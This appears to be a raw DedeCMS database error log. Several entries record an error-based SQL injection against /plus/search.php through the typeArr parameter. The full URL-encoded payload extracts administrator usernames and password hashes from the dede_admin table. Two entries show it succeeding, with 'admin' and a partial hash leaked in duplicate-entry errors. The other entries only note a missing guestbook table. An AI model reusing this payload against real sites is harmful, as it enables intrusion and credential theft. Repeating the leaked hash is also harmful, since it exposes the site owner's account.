<?php  exit();
/*
Page: /plus/search.php?keyword=as&typeArr[111%3D@%60%5C%27%60)+and+(SELECT+1+FROM+(select+count(*),concat(floor(rand(0)*2),(substring((select+group_CONCAT(0x7e7e7e,userid,0x7c7c7c,pwd,0x7e7e7e)+from+%60%23@__admin%60+limit+0,5),1,62)))a+from+information_schema.tables+group+by+a)b)%23@%60%5C%27%60+]=a
Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ') and (SELECT 1 FROM (select count(*),concat(floor(rand(0)*2),(substring((select' at line 1 <br />Error sql: <font color='red'>SELECT channeltype FROM `dede_arctype` WHERE id=111=@`\'`) and (SELECT 1 FROM (select count(*),concat(floor(rand(0)*2),(substring((select group_CONCAT(0x7e7e7e,userid,0x7c7c7c,pwd,0x7e7e7e) from `dede_admin` limit 0,5),1,62)))a from information_schema.tables group by a)b)#@`\'` </font>
*/
?>
<?php  exit();
/*
Page: /plus/guestbook.php
Error: Table 'dedecmsv57utf8.dede_guestbook' doesn't exist <br />Error sql: <font color='red'>SELECT COUNT(*) AS dd FROM `dede_guestbook` WHERE ischeck=1 LIMIT 0,1;</font>
*/
?>
<?php  exit();
/*
Page: /plus/guestbook.php
Error: Table 'dedecmsv57utf8.dede_guestbook' doesn't exist <br />Error sql: <font color='red'>SELECT * FROM `dede_guestbook` WHERE ischeck=1 ORDER BY id DESC LIMIT 0,10</font>
*/
?>
<?php  exit();
/*
Page: /plus/search.php?keyword=as&typeArr[111%3D@%60%5C%27%60)+and+(SELECT+1+FROM+(select+count(*),concat(floor(rand(0)*2),(substring((select+group_CONCAT(0x7e7e7e,userid,0x7c7c7c,pwd,0x7e7e7e)+from+%60%23@__admin%60+limit+0,5),1,62)))a+from+information_schema.tables+group+by+a)b)%23@%60%5C%27%60+]=a
Error: Duplicate entry '1~~~admin|||e80a7a0bd9ef71d8cf97~~~' for key 'group_key' <br />Error sql: <font color='red'>SELECT * FROM `dede_archives` arc WHERE  typeid IN (111=@`\'`) and (SELECT 1 FROM (select count(*),concat(floor(rand(0)*2),(substring((select group_CONCAT(0x7e7e7e,userid,0x7c7c7c,pwd,0x7e7e7e) from `dede_admin` limit 0,5),1,62)))a from information_schema.tables group by a)b)#@`\'` )  AND  arc.arcrank > -1  AND ( CONCAT(arc.title,' ',arc.writer,' ',arc.keywords) LIKE '%s%' )</font>
*/
?>
<?php  exit();
/*
Page: /plus/search.php?keyword=as&typeArr[111%3D@%60%5C%27%60)+and+(SELECT+1+FROM+(select+count(*),concat(floor(rand(0)*2),(substring((select+group_CONCAT(0x7e7e7e,userid,0x7c7c7c,pwd,0x7e7e7e)+from+%60%23@__admin%60+limit+0,5),1,62)))a+from+information_schema.tables+group+by+a)b)%23@%60%5C%27%60+]=a
Error: Duplicate entry '1~~~admin|||e80a7a0bd9ef71d8cf97~~~' for key 'group_key' <br />Error sql: <font color='red'>SELECT arc.*,act.typedir,act.typename,act.isdefault,act.defaultname,act.namerule,
            act.namerule2,act.ispart,act.moresite,act.siteurl,act.sitepath
            FROM `dede_archives` arc LEFT JOIN `dede_arctype` act ON arc.typeid=act.id
            WHERE  typeid IN (111=@`\'`) and (SELECT 1 FROM (select count(*),concat(floor(rand(0)*2),(substring((select group_CONCAT(0x7e7e7e,userid,0x7c7c7c,pwd,0x7e7e7e) from `dede_admin` limit 0,5),1,62)))a from information_schema.tables group by a)b)#@`\'` )  AND  arc.arcrank > -1  AND ( CONCAT(arc.title,' ',arc.writer,' ',arc.keywords) LIKE '%s%' )  ORDER BY arc.sortrank desc LIMIT 0,10</font>
*/
?>
